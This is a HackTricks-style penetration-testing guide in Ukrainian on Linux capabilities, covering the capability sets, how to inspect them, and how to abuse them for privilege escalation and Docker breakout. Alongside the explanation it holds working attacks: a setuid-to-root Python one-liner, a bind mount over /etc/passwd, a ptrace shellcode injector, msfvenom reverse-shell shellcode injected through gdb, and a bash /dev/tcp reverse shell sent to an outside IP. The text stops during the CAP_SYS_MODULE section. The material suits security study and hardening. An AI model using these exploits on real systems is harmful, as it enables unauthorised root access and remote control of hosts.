# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}

Linux capabilities поділяють **привілеї root на менші, окремі одиниці**, дозволяючи процесам мати підмножину привілеїв. Це мінімізує ризики, оскільки повні привілеї root не надаються без необхідності.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[14]](#references)</sup>

### Проблема:

- Звичайні користувачі мають обмежені дозволи для таких операцій, як відкриття raw sockets або прив'язування Internet-портів нижче 1024; capabilities можуть надати лише потрібну операцію замість повних привілеїв root.<sup>[[14]](#references)</sup>

### Набори capabilities:

Linux надає ці набори capabilities для кожного thread, а kernel застосовує їхні обмеження, коли процес змінює credentials або виконує файл.<sup>[[14]](#references)</sup>

1. **Inherited (CapInh)**:

- **Призначення**: Визначає capabilities, які можуть додаватися до permitted set після `execve()`, якщо виконуваний файл має відповідні inheritable file capabilities.
- **Функціональність**: Inheritable set thread зберігається під час `execve()`; сам по собі він не робить ці capabilities effective.
- **Обмеження**: Додавання capability до цього набору обмежується permitted і bounding sets.<sup>[[14]](#references)</sup>

2. **Effective (CapEff)**:

- **Призначення**: Представляє фактичні capabilities, які процес використовує в певний момент.
- **Функціональність**: Це набір capabilities, який kernel перевіряє для надання дозволу на різні операції. Для файлів цей набір може бути прапорцем, що вказує, чи слід вважати permitted capabilities файлу effective.
- **Значення**: Effective set має вирішальне значення для негайних перевірок привілеїв, виступаючи активним набором capabilities, які може використовувати процес.

3. **Permitted (CapPrm)**:

- **Призначення**: Визначає максимальний набір capabilities, якими може володіти процес.
- **Функціональність**: Процес може перемістити capability з permitted set до effective set, отримавши можливість її використовувати. Він також може видаляти capabilities зі свого permitted set.
- **Межа**: Якщо capability видалено з цього набору, її зазвичай неможливо відновити без виконання файлу, який її надає, або іншого привілейованого переходу.<sup>[[14]](#references)</sup>

4. **Bounding (CapBnd)**:

- **Призначення**: Обмежує capabilities, які процес може отримати з файлу під час `execve()`, а також capabilities, які він може додати до свого inheritable set.
- **Функціональність**: Цей набір успадковується під час `fork()` і зберігається під час `execve()`; capabilities можна видаляти з нього, якщо caller має `CAP_SETPCAP`.
- **Використання**: Видалення непотрібних capabilities із цього набору обмежує подальше отримання привілеїв.<sup>[[14]](#references)</sup>

5. **Ambient (CapAmb)**:
- **Призначення**: Дозволяє вибраним capabilities залишатися permitted і effective під час `execve()` непривілейованої програми.
- **Функціональність**: Ambient capabilities додаються до нових permitted і effective sets, якщо виконуваний файл не є привілейованим.
- **Обмеження**: Capability може бути ambient лише тоді, коли вона присутня одночасно в permitted та inheritable sets; виконання set-user-ID/set-group-ID файлу або файлу з capabilities очищає ambient set.<sup>[[8]](#references)[[9]](#references)[[14]](#references)</sup>

## Capabilities процесів і binaries

### Capabilities процесів

Щоб переглянути capabilities певного процесу, використовуйте файл **status** у каталозі /proc. Оскільки він надає більше деталей, обмежимося лише інформацією, пов'язаною з Linux capabilities.\
Зверніть увагу, що для всіх запущених процесів інформація про capabilities зберігається окремо для кожного thread, тоді як file capabilities зберігаються в розширених атрибутах `security.capability`.<sup>[[14]](#references)[[15]](#references)</sup>

Визначення capabilities можна знайти в /usr/include/linux/capability.h

Capabilities поточного процесу можна переглянути за допомогою `cat /proc/self/status` або `capsh --print`, а capabilities інших процесів — у `/proc/<pid>/status`.<sup>[[15]](#references)[[26]](#references)</sup>
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Ця команда має повертати п’ять рядків capabilities у більшості систем.<sup>[[15]](#references)</sup>

- CapInh = успадковані capabilities
- CapPrm = дозволені capabilities
- CapEff = ефективні capabilities
- CapBnd = bounding set
- CapAmb = набір ambient capabilities
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Ці шістнадцяткові числа не мають сенсу. За допомогою утиліти `capsh` ми можемо декодувати їх у назви capabilities.<sup>[[26]](#references)</sup>
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Перевіримо тепер **capabilities**, які використовує `ping`:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Хоча це працює, існує інший і простіший спосіб. Щоб переглянути capabilities запущеного процесу, використайте інструмент **getpcaps**, вказавши його ідентифікатор процесу (PID); він також приймає список ідентифікаторів процесів.<sup>[[22]](#references)</sup>
```bash
getpcaps 1234
```
Перевіримо capabilities `tcpdump` після надання binary `cap_net_admin` і `cap_net_raw` для перехоплення мережевого трафіку (`tcpdump` працює у process 9562).<sup>[[22]](#references)[[25]](#references)</sup>
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Як бачите, capabilities відповідають результатам двох способів перевірки процесу. Інструмент `getpcaps` використовує libcap для запиту capabilities цільового процесу та виводить їх у текстовій формі; він приймає один або кілька PID.<sup>[[22]](#references)</sup>

### Capabilities двійкових файлів

Двійкові файли можуть мати file capabilities, які застосовуються під час виконання. Наприклад, двійковий файл `ping` може мати capability `cap_net_raw`.<sup>[[14]](#references)</sup>
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Ви можете **шукати бінарні файли з capabilities** за допомогою `getcap -r`.<sup>[[23]](#references)</sup>
```bash
getcap -r / 2>/dev/null
```
### Dropping capabilities with capsh

Якщо ми вилучимо `CAP_NET_RAW` із поточного bounding set, програма, якій потрібна ця capability, більше не повинна мати змоги її використовувати.<sup>[[26]](#references)</sup>
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Окрім виводу самого _capsh_, команда _tcpdump_ також має завершитися з помилкою.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

Помилка показує, що `tcpdump` не може виконатися із запитаною file capability після видалення `CAP_NET_RAW` з bounding set.

### Видалення Capabilities

Ви можете видалити capabilities файлу за допомогою `setcap -r`.<sup>[[25]](#references)</sup>
```bash
setcap -r </path/to/binary>
```
## Можливості користувачів

Linux не призначає capabilities безпосередньо користувачу для входу в систему, але PAM-модуль `pam_cap` може встановлювати успадковувані capabilities для автентифікованих сесій за допомогою `/etc/security/capability.conf`.<sup>[[16]](#references)</sup> Кожен запис зіставляє назви або номери capabilities, розділені комами, з одним або кількома іменами користувачів.<sup>[[17]](#references)</sup>
Приклад файлу:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Capabilities середовища

Компіляція наведеної нижче програми дає змогу **запустити оболонку bash у середовищі, що надає capabilities**.<sup>[[14]](#references)</sup>
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
У **bash, виконаному скомпільованим ambient binary**, можна побачити **нові capabilities** (звичайний користувач не матиме жодної capability у секції "current").<sup>[[14]](#references)</sup>
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> Ви можете **додавати лише capabilities, які присутні** одночасно в наборах permitted та inheritable.<sup>[[14]](#references)</sup>

### Бінарні файли, що враховують capabilities/не враховують capabilities

Бінарний файл, що не враховує capabilities, — це програма з файловими capabilities, яка не використовує libcap для керування ними. Якщо для файлу встановлено effective bit, ядро вмикає permitted capabilities файлу в effective set процесу; виконання може завершитися помилкою, якщо процес не отримав усі permitted capabilities.<sup>[[14]](#references)</sup>

## Capabilities сервісу

Системний сервіс, який працює від імені root, може зберігати широкі capabilities, якщо середовище його виконання не обмежує їх. У блоці systemd `User=` визначає користувача сервісу, а `AmbientCapabilities=` додає вказані capabilities до ambient set процесу, що виконується.<sup>[[18]](#references)</sup>
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Capabilities in Docker Containers

Docker запускає контейнери з набором capabilities за замовчуванням, який можна змінити за допомогою `--cap-add` і `--cap-drop`; приклад контейнера можна перевірити за допомогою `amicontained`.<sup>[[19]](#references)[[24]](#references)</sup>
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

Capabilities корисні, коли потрібно **обмежити власні процеси після виконання привілейованих операцій** (наприклад, після налаштування chroot і прив’язування до сокета). Однак їх можна використати, передавши їм шкідливі команди або аргументи, які потім виконуються від імені root.<sup>[[2]](#references)</sup>

Ви можете примусово призначити file capabilities програмам за допомогою `setcap`, а перевірити їх за допомогою `getcap`.<sup>[[23]](#references)[[25]](#references)</sup>
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
Для тексту file-capability, `+ep` підвищує вказану capability в effective та permitted наборах; `-` знижує вибрані flags.<sup>[[21]](#references)</sup>

Щоб визначити програми в системі або папці, які мають capabilities, використовуйте `getcap -r`.<sup>[[23]](#references)</sup>
```bash
getcap -r / 2>/dev/null
```
### Приклад exploitation

У наведеному нижче прикладі бінарний файл `/usr/bin/python2.6` виявився вразливим до privesc:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Capabilities**, необхідні `tcpdump`, щоб **дозволити будь-якому користувачу перехоплювати пакети**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### Особливий випадок «порожніх» capabilities

Файл може містити порожній набір capabilities (`getcap myelf` повертає `myelf =ep`). Порожній набір не надає жодних capabilities; у поєднанні з root-owned бітом set-user-ID програма все одно може змінити effective та saved IDs процесу, що виконується, на 0, не отримуючи file capabilities. Файл без власника, без SUID/SGID і з `=ep` не запускається від імені root.<sup>[[14]](#references)</sup>

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** — це надзвичайно потужна Linux capability, яку часто прирівнюють до рівня, близького до root, через її широкі **адміністративні привілеї**, зокрема можливість монтувати пристрої або змінювати функції ядра. Хоча вона незамінна для контейнерів, що імітують цілі системи, **`CAP_SYS_ADMIN` створює значні проблеми безпеки**, особливо в контейнеризованих середовищах, через потенційну ескалацію привілеїв і компрометацію системи. Тому її використання потребує суворого оцінювання безпеки та обережного керування; для контейнерів, призначених для конкретних застосунків, цю capability бажано вилучати, дотримуючись **принципу найменших привілеїв** і мінімізуючи attack surface.<sup>[[14]](#references)</sup>

Для namespace pivots важливий scope: `setns()` перевіряє `CAP_SYS_ADMIN` щодо user namespace, якому належить цільовий namespace. Вхід до mount namespace також потребує `CAP_SYS_CHROOT` у user namespace, що належить виклику. Тому capability, наявна лише всередині приватного remapped user namespace, не надає довільного доступу до initial host namespaces.<sup>[[14]](#references)</sup>

**Приклад із binary**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
За допомогою Python можна змонтувати змінений файл _passwd_ поверх справжнього файлу _passwd_:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
І нарешті **змонтуйте** змінений файл `passwd` у `/etc/passwd`:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
І ви зможете виконати **`su` до root** використовуючи пароль "password".

**Приклад із середовищем (Docker breakout)**

Ви можете перевірити увімкнені capabilities усередині docker-контейнера за допомогою:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
У попередньому виводі видно, що capability SYS_ADMIN увімкнено.<sup>[[14]](#references)</sup>

- **Mount**

За наявності відповідного доступу до пристроїв і namespace це може дозволити Docker container **підключити диск host і отримати доступ до його вмісту**. Вузол пристрою має представляти реальний пристрій host, device cgroup має дозволяти це, а для підключення block-based filesystem потрібен `CAP_SYS_ADMIN` в initial user namespace.<sup>[[14]](#references)</sup>
```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/sda1 # Replace with the validated filesystem partition or LV.
mkdir -p /mnt/host
mount -o ro "${node_root_device}" /mnt/host
cat /mnt/host/etc/hostname
umount /mnt/host
```
- **Повний доступ**

У попередньому методі нам вдалося отримати доступ до диска хоста.\
Якщо на хості запущено сервер **ssh**, ви можете **створити користувача на змонтованому диску** та отримати доступ до нього через SSH.<sup>[[14]](#references)</sup>
```bash
#Like in the example before, the first step is to mount the docker host disk
node_root_device=/dev/sda1
mount "${node_root_device}" /mnt/host

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/host adduser john
ssh john@172.17.0.1 -p 2222
```
Пряме читання та запис у `/mnt/host` уже є доступом до файлової системи host. Фінальний `chroot` лише спрощує роботу з pathname і додатково потребує `CAP_SYS_CHROOT`; саме цей крок не створює escape.

## CAP_SYS_PTRACE

Маючи `CAP_SYS_PTRACE`, process може трасувати та перевіряти інші processes, видимі в його PID namespace. Щоб націлитися на processes host із Docker container, потрібно спільно використовувати host PID namespace за допомогою `--pid=host` (або приєднатися до namespace, що містить цільовий process).<sup>[[14]](#references)[[20]](#references)</sup>

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** надає можливість використовувати функції debugging і system call tracing, які надаються `ptrace(2)`, а також cross-memory attach calls, як-от `process_vm_readv(2)` і `process_vm_writev(2)`. Хоча це потужний інструмент для діагностики та monitoring, якщо `CAP_SYS_PTRACE` увімкнено без restrictive measures, як-от seccomp filter для `ptrace(2)`, це може суттєво підірвати security системи. Зокрема, його можна використати для обходу інших security restrictions, особливо тих, що встановлені seccomp, як продемонстровано в [proofs of concept (PoC) на кшталт цього](https://gist.github.com/thejh/8346f47e359adecd1d53).<sup>[[10]](#references)</sup>

**Приклад із binary (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Приклад із бінарним файлом (gdb)**

`gdb` із capability `ptrace`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
Створити shellcode за допомогою msfvenom для ін’єкції в пам’ять через gdb
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Налагодьте root-процес за допомогою gdb і скопіюйте та вставте попередньо згенеровані рядки gdb:
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Приклад із середовищем (Docker breakout) - Another gdb Abuse**

Якщо встановлено **GDB** (або його можна встановити, наприклад, за допомогою `apk add gdb` чи `apt install gdb`), ви можете **налагодити видимий процес host** і змусити його викликати функцію `system`. Для цього потрібні ефективна capability `CAP_SYS_PTRACE` у user namespace цілі та видимість PID host; `CAP_SYS_ADMIN` **не потрібна**. Yama, стан non-dumpable, seccomp і політика LSM усе ще можуть блокувати attach.
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
Ви не зможете побачити вивід виконаної команди, але цей процес її виконає (тому отримайте rev shell).

> [!WARNING]
> Якщо ви отримуєте помилку "No symbol "system" in current context.", перегляньте попередній приклад завантаження shellcode у програму через gdb.

**Приклад із environment (Docker breakout) - Shellcode Injection**

Ви можете перевірити увімкнені capabilities усередині docker container за допомогою:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
Список **процесів**, запущених на **host**: `ps -eaf`

1. Визначте **архітектуру**: `uname -m`
2. Знайдіть **shellcode** для цієї архітектури ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Знайдіть **програму** для **ін'єкції** **shellcode** у пам'ять процесу ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **Змініть** **shellcode** усередині програми та **скомпілюйте** її: `gcc inject.c -o inject`
5. **Виконайте ін'єкцію** та отримайте свій **shell**: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** надає процесу можливість **завантажувати та вивантажувати kernel modules (системні виклики `init_module(2)`, `finit_module(2)` і `delete_module(2)`)**, забезпечуючи прямий доступ до основних операцій kernel. Ця capability створює критичні ризики для безпеки, оскільки завантаження module може змінити поведінку kernel і порушити межі ізоляції.<sup>[[6]](#references)[[14]](#references)</sup>
У звичайному rootful Linux container це націлено на **спільний kernel host** і тому є прямим breakout. Capability має бути effective у початковому user namespace, оскільки завантаження modules не підтримує namespace. Runtime, ізольований через userspace-kernel або VM, наприклад gVisor, Kata чи Hyper-V, змінює доступну межу kernel. Завантаження modules усе ще може бути заблоковане параметром `modules_disabled`, kernel lockdown, перевіркою підписів, seccomp або LSM.<sup>[[14]](#references)</sup>

**Приклад із binary**

У наведеному нижче прикладі binary **`python`** має цю capability.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
За замовчуванням команда **`modprobe`** перевіряє списки залежностей і файли map у каталозі **`/lib/modules/$(uname -r)`**.\
Щоб скористатися цим, створімо підроблену папку **lib/modules**:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Потім **скомпілюйте kernel module, 2 приклади якого наведено нижче, і скопіюйте** його до цієї папки:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Насамкінець виконайте необхідний код Python, щоб завантажити цей kernel module:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Приклад 2 із binary**

У наведеному нижче прикладі binary **`kmod`** має цю capability.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Що означає, що можна використовувати команду **`insmod`** для вставлення kernel module. Скористайтеся наведеним нижче прикладом, щоб отримати **reverse shell**, використовуючи цю привілею.

**Приклад із середовищем (Docker breakout)**

Перевірити дозволені capabilities усередині Docker container можна за допомогою:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
